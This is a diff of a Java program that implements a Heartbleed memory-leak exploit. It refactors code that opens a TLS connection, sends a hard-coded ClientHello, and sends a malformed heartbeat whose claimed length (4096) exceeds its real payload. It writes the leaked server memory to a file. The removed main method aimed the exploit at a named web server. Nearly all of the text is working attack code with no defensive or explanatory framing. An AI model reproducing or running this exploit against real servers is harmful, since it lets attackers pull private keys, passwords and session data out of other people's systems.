@@ -9,25 +9,77 @@ import java.io.UnsupportedEncodingException;
 
 public class HeartBleed {
 
+	private Socket connection;
+	private InputStream inStr;
+	private OutputStream outStr;
 	
-//	static byte[] hb = {
-//		0x18, //ssl/tls type (24)
-//		0x03,0x02, // tls version 3
-//		0x00,0x0A, //length
-//		0x01,	   //1 = request
-//		0x00,0x00, (byte)0xFF, (byte)0xFA  //alleged length(16384)
-//
-//		};
-//  old hb hex size 16384
-	static byte[] hb = {
-			0x18, //ssl/tls type (24)
-			0x03,0x02, // tls version 3
-			0x00,0x03, //length
-			0x01,	   //1 = request
-			0x40,0x00,  //alleged length(16384)
+	private TLSmsg finalMessage;
+	
+	public void connect(String server, int port) throws IOException{
+		
+		//open connection
+		if(port == 0){
+			connection = new Socket(server, 443);//443 default ssl port
+		}else{
+			connection = new Socket(server, port);
+		}
+		inStr = connection.getInputStream();
+		outStr = connection.getOutputStream();
+	
+	}
+	
+	public void hello() throws IOException{
+		
+		//send ssl/tls hello
+		System.out.println("Sending hello...");
+		outStr.write(clientHello);
+		outStr.flush();
+		
+		while(true){
+			TLSmsg m = readPacket(inStr);
+			// 22 (handshake) 0x0E (server done)
+			if(m.type == 22 && m.body[0] == 0x0E){
+				System.out.println("Hello recieved!");
+				System.out.printf("Type: %d Version: %d Length: %d\n", m.type, m.version, m.length);
+				break;
+			}
 			
-			};
+		}
+		
+	}
 	
+	//sends/receives the heartbeat
+	public void heartBeat(String message) throws IOException{
+		
+		System.out.println("Sending Heartbeat...");
+		outStr.write(makeHeartBeat(message,4096));
+		outStr.flush();
+		
+		
+		while(true){
+			finalMessage = readPacket(inStr);
+			
+			if(finalMessage.type== 24){
+				System.out.println("Heartbeat recieved!");
+				System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
+				break;
+			}
+			if(finalMessage.type == 21){
+				System.out.println("Error");
+				break;
+			}
+		}
+		
+	}
+	
+	public void save() throws IOException{
+		FileOutputStream out = new FileOutputStream("hbTest.txt", true);
+		out.write(finalMessage.body);
+		out.flush();
+		out.close();
+	} 
+	
+	//hex dump of an SSL/TLS hello message
 	static byte[] clientHello = {
 			0x16,0x03,0x02,0x00,(byte) 0xdc,0x01,0x00,0x00,(byte) 0xd8,0x03,0x02
 			,0x53,0x43,0x5b,(byte) 0x90,(byte) 0x9d,(byte) 0x9b,0x72,0x0b,(byte) 0xbc,
@@ -50,83 +102,10 @@ public class HeartBleed {
 			 0x00,0x0f,0x00,0x10,0x00,0x11,0x00,0x23,0x00,0x00,0x00,0x0f,0x00,0x01,0x01
 			 }; 
 	
-	public static void main(String[] args) {
 
-		try
-		{
-			Socket testSocket = new Socket("webserver.com.my", 443);
-			InputStream inStr = testSocket.getInputStream();
-			OutputStream outStr = testSocket.getOutputStream();
-			
-			System.out.println("Sending hello...");
-			outStr.write(clientHello);
-			outStr.flush();
-			
-			while(true){
-				TLSmsg m = readPacket(inStr);
-				// 22 (handshake) 0x0E (server done)
-				if(m.type == 22 && m.body[0] == 0x0E){
-					System.out.println("Hello recieved!");
-					System.out.printf("Type: %d Version: %d Length: %d\n", m.type, m.version, m.length);
-					break;
-				}
-				
-			}
-			
-			System.out.println("Sending Heartbeat...");
-			outStr.write(heartBeat("This is Alex",4096));
-			outStr.flush();
-			
-			TLSmsg bleed = null;
-			while(true){
-				bleed = readPacket(inStr);
-				
-				if(bleed.type== 24){
-					System.out.println("Heartbeat recieved!");
-					System.out.printf("Type: %d Version: %d Length: %d\n", bleed.type, bleed.version, bleed.length);
-					break;
-				}
-				if(bleed.type == 21){
-					System.out.println("Error");
-					break;
-				}
-			}
-			FileOutputStream out = new FileOutputStream("hbTest.txt", true);
-			out.write(bleed.body);
-			out.flush();
-			out.close();
-			
-			
-
-
-
-		}
-		catch(IOException e){
-			System.out.println(e.getMessage());
-		}
-	}
-	
-
-//	//constructs a heartbeat with variable length
-//	private static byte[] heartBeat(int realLen, int claimedLen){
-//		// 8 = sum of tls record lengths
-//		ByteBuffer bb = ByteBuffer.allocate(8 + realLen);
-//		
-//		bb.put((byte)24);
-//		bb.putShort((short)770);
-//		bb.putShort((short)(3 + realLen));
-//		bb.put((byte)1);
-//		bb.putShort((short)claimedLen);
-//		
-//		for(int i=0; i<realLen; i++){
-//			bb.put((byte)0x00);
-//		}
-//		
-//		return bb.array();
-//	} 
 	
 	//constructs a heartbeat with custom message
-	private static byte[] heartBeat(String message, int claimedLen){
+	private static byte[] makeHeartBeat(String message, int claimedLen){
 		// 8 = sum of tls record lengths
 		int realLen = message.length();
 		
